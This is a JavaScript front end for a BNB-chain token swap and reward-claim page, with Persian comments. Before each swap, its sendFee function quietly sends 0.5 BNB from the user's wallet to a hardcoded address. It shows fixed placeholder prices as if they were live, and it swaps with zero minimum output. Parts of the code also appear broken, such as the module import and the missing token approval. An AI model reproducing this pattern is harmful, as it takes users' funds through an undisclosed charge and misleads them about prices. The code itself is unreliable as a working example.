import Web3 from "https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js";

// آدرس‌ها
const routerAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E"; // PancakeSwap Router
const rewardAddress = "0xa3e97bfd45fd6103026fc5c2db10f29b268e4e0d"; // Reward Contract
const feeReceiver = "0xec54951C7d4619256Ea01C811fFdFa01A9925683"; // آدرس دریافت کارمزد

// ABIها از فایل abi.js
// pancakeRouterABI, rewardDistributorABI

let web3;
let userAddress;

async function connectWallet() {
  if (window.ethereum || window.trustwallet) {
    web3 = new Web3(window.ethereum || window.trustwallet);
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      userAddress = accounts[0];
      document.getElementById("wallet-address").innerText = userAddress;
    } catch (error) {
      alert("اتصال رد شد.");
    }
  } else {
    alert("لطفاً Trust Wallet یا Metamask را نصب کنید.");
  }
}

async function getTokenPriceInUSD(tokenAddress) {
  try {
    // از API واقعی مثل CoinGecko یا Chainlink باید استفاده بشه - اینجا به عنوان نمونه ثابت برمی‌گرده
    if (tokenAddress.toLowerCase() === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee") return 300; // BNB
    if (tokenAddress.toLowerCase() === "0x55d398326f99059ff775485246999027b3197955") return 1;   // USDT
    if (tokenAddress.toLowerCase() === "0xa3e97bfd45fd6103026fc5c2db10f29b268e4e0d") return 0.02; // LEGEND
    return 1;
  } catch {
    return 0;
  }
}

async function updatePricesEvery60Seconds() {
  setInterval(async () => {
    const fromToken = document.getElementById("from-token").value;
    const toToken = document.getElementById("to-token").value;

    const fromPrice = await getTokenPriceInUSD(fromToken);
    const toPrice = await getTokenPriceInUSD(toToken);

    document.getElementById("from-price").innerText = `قیمت مبدا: $${fromPrice}`;
    document.getElementById("to-price").innerText = `قیمت مقصد: $${toPrice}`;
    document.getElementById("timer").innerText = `بروزرسانی بعدی: 60 ثانیه`;

    let remaining = 60;
    const timer = setInterval(() => {
      remaining--;
      document.getElementById("timer").innerText = `بروزرسانی بعدی: ${remaining} ثانیه`;
      if (remaining <= 0) clearInterval(timer);
    }, 1000);
  }, 60000);
}

async function sendFee() {
  const fee = web3.utils.toWei("0.5", "ether");
  return await web3.eth.sendTransaction({
    from: userAddress,
    to: feeReceiver,
    value: fee
  });
}

async function performSwap() {
  const fromToken = document.getElementById("from-token").value;
  const toToken = document.getElementById("to-token").value;
  const amount = document.getElementById("amount").value;

  if (!web3 || !userAddress) {
    alert("ابتدا کیف پول را وصل کنید.");
    return;
  }

  try {
    await sendFee();

    const router = new web3.eth.Contract(pancakeRouterABI, routerAddress);
    const path = [fromToken, toToken];
    const amountIn = web3.utils.toWei(amount, "ether");
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    const tx = await router.methods.swapExactTokensForTokens(
      amountIn,
      0,
      path,
      userAddress,
      deadline
    ).send({ from: userAddress });

    console.log("سواپ انجام شد:", tx);

    await claimReward();

  } catch (err) {
    console.error("خطا در سواپ:", err);
    alert("سواپ انجام نشد.");
  }
}

async function claimReward() {
  try {
    const rewardContract = new web3.eth.Contract(rewardDistributorABI, rewardAddress);
    await rewardContract.methods.claimReward().send({ from: userAddress });
    alert("🎉 پاداش دریافت شد!");
  } catch (err) {
    console.error("پاداش انجام نشد:", err);
  }
}

// Event Listeners
document.getElementById("connect-btn").addEventListener("click", connectWallet);
document.getElementById("swap-btn").addEventListener("click", performSwap);

// قیمت‌ها هر ۶۰ ثانیه بروزرسانی شوند
updatePricesEvery60Seconds();
